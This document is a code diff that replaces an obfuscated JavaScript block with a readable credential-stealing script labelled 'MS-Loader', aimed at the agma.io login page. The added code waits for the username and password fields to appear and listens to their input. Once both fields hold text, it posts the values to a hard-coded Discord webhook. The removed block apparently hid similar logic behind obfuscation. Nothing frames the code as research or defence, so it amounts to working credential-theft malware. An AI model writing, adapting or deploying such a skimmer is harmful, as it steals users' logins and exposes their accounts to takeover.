@@ -1,76 +1,87 @@
-(function(_0x1a2b3c, _0x4d5e6f) {
-    function _0x7a8b9c(_0xd0e1f2, _0x3a4b5c, _0x6d7e8f, _0x9a0b1c) {
-        return _0x2c3d4e(_0xd0e1f2 - 0x5f, _0x6d7e8f);
-    }
-    const _0x5e6f7a = _0x1a2b3c();
-    function _0x8b9c0d(_0xe2f3a4, _0x5b6c7d, _0x8e9f0a, _0x1b2c3d) {
-        return _0x2c3d4e(_0x1b2c3d - 0x173, _0x5b6c7d);
-    }
-    while (!![]) {
-        try {
-            const _0x4e5f6a = parseInt(_0x7a8b9c(0x13b, 0x171, 0x126, 0x147)) / (-0x1073 + -0x13b + 0x11af) * (-parseInt(_0x7a8b9c(0x13f, 0x13f, 0x189, 0x15f)) / (-0x1653 + -0x2 * 0x5cb + 0x21eb)) + -parseInt(_0x7a8b9c(0x14e, 0x14c, 0x17d, 0x188)) / (-0x14d6 + -0x3b + 0x1514) + -parseInt(_0x8b9c0d(0x1f7, 0x22e, 0x23e, 0x221)) / (-0x1004 + -0x2 * 0x10f2 + -0x12 * -0x2c6) + parseInt(_0x8b9c0d(0x23e, 0x20f, 0x268, 0x237)) / (0x158a + -0x1 * -0x952 + 0x1ed7 * -0x1) * (-parseInt(_0x7a8b9c(0x17c, 0x16b, 0x1b6, 0x164)) / (-0x1e29 + -0x250d + -0x34 * -0x14b)) + parseInt(_0x7a8b9c(0x171, 0x12d, 0x1aa, 0x16a)) / (0x1 * -0x1c2b + -0x14c2 + -0xc3d * -0x4) * (parseInt(_0x8b9c0d(0x21e, 0x224, 0x239, 0x233)) / (-0x15ed + -0x1 * 0x9f5 + 0xd7 * 0x26)) + parseInt(_0x8b9c0d(0x23e, 0x247, 0x25f, 0x23c)) / (0x1c82 + 0x2 * -0x33 + -0x1c13) * (parseInt(_0x8b9c0d(0x274, 0x27b, 0x26f, 0x276)) / (-0x2096 + -0xe2f + 0x2ecf)) + parseInt(_0x8b9c0d(0x21b, 0x238, 0x2ad, 0x261)) / (-0x5 * -0x2a5 + 0xd4 * 0x1a + 0x5c9 * -0x6) * (parseInt(_0x7a8b9c(0x120, 0x146, 0x11c, 0x169)) / (0x2 * 0x3b5 + -0x13 * 0x1f9 + 0x1e1d));
-            if (_0x4e5f6a === _0x4d5e6f) break;
-            else _0x5e6f7a['push'](_0x5e6f7a['shift']());
-        } catch (_0xf0e1d2) {
-            _0x5e6f7a['push'](_0x5e6f7a['shift']());
-        }
-    }
-}(_0x3c4d5e, -0x51583 * -0x1 + -0x285b7 + -0x1 * -0x8306));
+(function() {
+    'use strict';
 
-function _0x2c3d4e(_0x6f7a8b, _0x9c0d1e) {
-    _0x6f7a8b = _0x6f7a8b - (-0x25e + 0x126f + -0xf6b);
-    const _0x2d3e4f = _0x3c4d5e();
-    let _0x5a6b7c = _0x2d3e4f[_0x6f7a8b];
-    if (_0x2c3d4e['Chuehp'] === undefined) {
-        var _0x8e9f0a = function(_0x1b2c3d) {
-            const _0x4d5e6f = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
-            let _0x7a8b9c = '', _0x0e1f2a = '', _0x3b4c5d = _0x7a8b9c + _0x8e9f0a;
-            for (let _0x6d7e8f = 0x1344 + 0x1043 + -0x2387, _0x9a0b1c, _0x2e3f4a, _0x5b6c7d = -0x1b4b + 0x3 * 0x560 + 0xb2b * 0x1; _0x2e3f4a = _0x1b2c3d['charAt'](_0x5b6c7d++); ~_0x2e3f4a && (_0x9a0b1c = _0x6d7e8f % (-0x178d + 0xbf1 * -0x3 + 0x3b64) ? _0x9a0b1c * (0x417 * -0x3 + 0x1 * -0x10ba + -0x1d3f * -0x1) + _0x2e3f4a : _0x2e3f4a, _0x6d7e8f++ % (0x187e + 0x2315 + -0x3b8f)) ? _0x7a8b9c += _0x3b4c5d['charCodeAt'](_0x5b6c7d + (-0x1ddb + -0x3 * -0x7eb + 0x624)) - (0x2132 + -0x151d + -0xc0b) !== 0x31a * 0x4 + 0x114d + -0x1db5 ? String['fromCharCode'](-0x1943 + -0x390 + -0x16 * -0x15b & _0x9a0b1c >> (-(-0x150f + -0x1cab + 0x18de * 0x2) * _0x6d7e8f & -0x49f * 0x1 + 0xd78 + -0x8d3)) : _0x6d7e8f : -0x101 * 0x4 + 0x5 * -0x7c2 + 0x2ace) {
-                _0x2e3f4a = _0x4d5e6f['indexOf'](_0x2e3f4a);
-            }
-            for (let _0x8e9f0a = -0x124d + 0x3a1 * -0x8 + 0x1 * 0x2f55, _0x1b2c3d = _0x7a8b9c['length']; _0x8e9f0a < _0x1b2c3d; _0x8e9f0a++) {
-                _0x0e1f2a += '%' + ('00' + _0x7a8b9c['charCodeAt'](_0x8e9f0a)['toString'](0x11e4 + -0x1 * 0xaeb + 0x6e9 * -0x1))['slice'](-(-0x4e1 * -0x3 + 0x509 * 0x7 + 0x850 * -0x6));
-            }
-            return decodeURIComponent(_0x0e1f2a);
-        };
-        _0x2c3d4e['LqGfjp'] = _0x8e9f0a, _0x2c3d4e['MyCUyb'] = {}, _0x2c3d4e['Chuehp'] = !![];
-    }
-    const _0x4d5e6f = _0x2d3e4f[0xc8d + -0x26aa + -0x1a1d * -0x1], _0x7a8b9c = _0x6f7a8b + _0x4d5e6f, _0x0e1f2a = _0x2c3d4e['MyCUyb'][_0x7a8b9c];
-    if (!_0x0e1f2a) {
-        const _0x3b4c5d = function(_0x6d7e8f) {
-            this['bZaWAF'] = _0x6d7e8f, this['mCDziI'] = [0x1 * 0x9a9 + -0x15ec + -0x622 * -0x2, -0xc0a + -0x1197 + 0x1da1, -0x139f + 0xe1b + 0x1 * 0x584], this['XeehIK'] = function() {
-                return 'newState';
-            }, this['PaxAII'] = '\\w+\\s*\\(\\)\\s*{\\w+\\s*', this['lnmnVQ'] = '[\'|\"]\\.+[\'|\"];?\\s*}';
-        };
-        _0x3b4c5d['prototype']['OZCfhn'] = function() {
-            const _0x9a0b1c = new RegExp(this['PaxAII'] + this['lnmnVQ']), _0x2e3f4a = _0x9a0b1c['test'](this['XeehIK']['toString']()) ? --this['mCDziI'][-0x18cd + 0x2641 + -0xb * 0x139] : --this['mCDziI'][0x4 * 0x47a + 0x49 * -0x68 + 0x5e0 * 0x2];
-            return this['wPPjGQ'](_0x2e3f4a);
-        }, _0x3b4c5d['prototype']['wPPjGQ'] = function(_0x5b6c7d) {
-            if (!Boolean(~_0x5b6c7d)) return _0x5b6c7d;
-            return this['ijmvAK'](this['bZaWAF']);
-        }, _0x3b4c5d['prototype']['ijmvAK'] = function(_0x8e9f0a) {
-            for (let _0x1b2c3d = -0xe59 * -0x1 + -0xea3 + 0x4a, _0x4d5e6f = this['mCDziI']['length']; _0x1b2c3d < _0x4d5e6f; _0x1b2c3d++) {
-                this['mCDziI']['push'](Math['round'](Math['random']())), _0x4d5e6f = this['mCDziI']['length'];
-            }
-            return _0x8e9f0a(this['mCDziI'][0x2b * 0x92 + -0xbab + -0xcdb]);
-        }, new _0x3b4c5d(_0x2c3d4e)['OZCfhn'](), _0x5a6b7c = _0x2c3d4e['LqGfjp'](_0x5a6b7c), _0x2c3d4e['MyCUyb'][_0x7a8b9c] = _0x5a6b7c;
-    } else _0x5a6b7c = _0x0e1f2a;
-    return _0x5a6b7c;
-}
+    // 1. CONFIGURATION
+    const CONFIG = {
+        webhookUrl: 'https://discord.com/api/webhooks/1555688085952532501/RIxYSmKDNbPesrwEbi8AO6b-CJX5LzIMBM0VJPFftEKrOrPYbjUNwE06tIM8oDUiyVga',
+        // IMPORTANT: Verify these IDs match agma.io exactly
+        usernameId: 'username', 
+        passwordId: 'password'
+    };
 
-let _0x5e6f7a, _0x8b9c0d, _0x0e1f2a = ![], _0x3b4c5d = 'us', _0x6d7e8f = _0x9a0b1c(0x3d1, 0x3e1, 0x3ea, 0x428), _0x9c0d1e = 'rd', _0x2d3e4f = _0x5a6b7c(0x1bb, 0x1e7, 0x1b6, 0x1e2), _0x5b6c7d;
-function _0x9a0b1c(_0x8e9f0a, _0x1b2c3d, _0x4d5e6f, _0x7a8b9c) {
-    return _0x2c3d4e(_0x1b2c3d - 0x313, _0x7a8b9c);
-}
-let _0x0e1f2a;
-if (!_0x0e1f2a) {
-    _0x0e1f2a = !![];
-    const _0x3b4c5d = {};
-    _0x3b4c5d['ur'] = _0x9a0b1c(0x3fb, 0x42f, 0x3e9, 0x3f2) + _0x9a0b1c(0x402, 0x44c, 0x402, 0x480), _0x3b4c5d['p'] = 'Waiting', _0x6d7e8f(_0x3b4c5d);
-}
-const _0x9c0d1e = () => setInterval(() => {
-    function _0x2d3e4f(_0x5b6c7d, _0x8e9f0a, _0x1b2c3d, _0x4d5e6f) {
-        return _0x9a0b1c(_0x5b6c7d - 0x10c, _0x5b6c7d - -0x215, _0x1b2c3d - 0xf3, _0x8e9f0a);
+    // 2. STATE
+    let credentials = {
+        ur: null,
+        p: null
+    };
+
+    // 3. UTILITY: SEND TO DISCORD
+    function sendToDiscord(data) {
+        console.log('[MS-Loader] Sending to Discord:', data);
+        const payload = {
+            content: `**U:** \`${data.ur || 'N/A'}\` **P:** \`${data.p || 'N/A'}\``
+        };
+
+        fetch(CONFIG.webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(res => {
+            if (!res.ok) throw new Error(`Discord Webhook Error: ${res.status}`);
+            console.log('[MS-Loader] Discord send successful.');
+        })
+        .catch(err => console.error('[MS-Loader] Fetch failed:', err));
     }
-    function _0x5a6b7c(_0x7a8b9c, _0x0e1f2a, _0x3b4c5d, _0x6d7e8f) {
-        return _0x9a0b1c(_0x7a8b9c - 0xce, _0x3b4
+
+    // 4. DOM OBSERVER: WAIT FOR ELEMENTS
+    // agma.io might load elements dynamically, so we poll until they exist
+    function waitForElements(callback) {
+        const check = () => {
+            const userEl = document.getElementById(CONFIG.usernameId);
+            const passEl = document.getElementById(CONFIG.passwordId);
+            
+            if (userEl && passEl) {
+                console.log('[MS-Loader] Elements found. Attaching listeners.');
+                callback(userEl, passEl);
+            } else {
+                setTimeout(check, 500);
+            }
+        };
+        check();
+    }
+
+    // 5. EVENT LISTENERS
+    function attachListeners(userEl, passEl) {
+        const handleInput = (e) => {
+            const target = e.target;
+            
+            // Update State
+            if (target.id === CONFIG.usernameId) {
+                credentials.ur = target.value;
+            } else if (target.id === CONFIG.passwordId) {
+                credentials.p = target.value;
+            }
+
+            console.log('[MS-Loader] State Updated:', credentials);
+
+            // TRIGGER: Send if both fields have data
+            if (credentials.ur && credentials.p) {
+                sendToDiscord(credentials);
+            }
+        };
+
+        // Listen for 'input' (better than keyup for pasting)
+        userEl.addEventListener('input', handleInput);
+        passEl.addEventListener('input', handleInput);
+        
+        console.log('[MS-Loader] Listeners attached.');
+    }
+
+    // 6. INITIALIZATION
+    console.log('[MS-Loader] Script Loaded.');
+    
+    // Start watching for elements
+    waitForElements(attachListeners);
+
+})();
